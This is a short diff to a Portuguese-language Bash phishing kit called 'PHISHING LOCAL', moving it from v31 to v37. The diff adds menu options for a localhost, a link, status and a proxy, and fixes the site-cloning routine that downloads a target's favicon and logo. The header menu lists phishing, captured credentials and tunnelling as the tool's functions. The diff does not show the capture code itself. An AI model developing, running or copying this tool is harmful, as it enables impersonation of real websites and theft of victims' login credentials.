@@ -1,7 +1,7 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v31 - Clonador Profissional
-# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Parar 0 Sair
+# 🎣 PHISHING LOCAL v37 - Clonador Profissional
+# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
@@ -117,7 +117,6 @@ clone_site() {
         # Baixar favicon/logo
         local favicon="$($curl_cmd $curl_opts -sI -L "${base_domain}/favicon.ico" 2>/dev/null | grep -i 'content-type.*image' || echo '')"
         $curl_cmd $curl_opts -s -o "$SITE_DIR/favicon.png" "${base_domain}/favicon.ico" 2>/dev/null
-        $curl_cmd $curl_opts -s -o "$favicon" "${base_domain}/favicon.ico" 2>/dev/null
 
         # Buscar logo no header
         local logo_url=$(grep -oE 'src="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/src="//;s/"//')
@@ -1097,7 +1096,7 @@ while true; do
     echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
     echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
     echo ""
-    echo -e "  🎣 PHISHING LOCAL \033[1;36mv31\033[0m — Clonador Profissional"
+    echo -e "  🎣 PHISHING LOCAL \033[1;36mv37\033[0m — Clonador Profissional"
     echo ""
     echo "  ─────────────────────────────────────────"
     echo ""
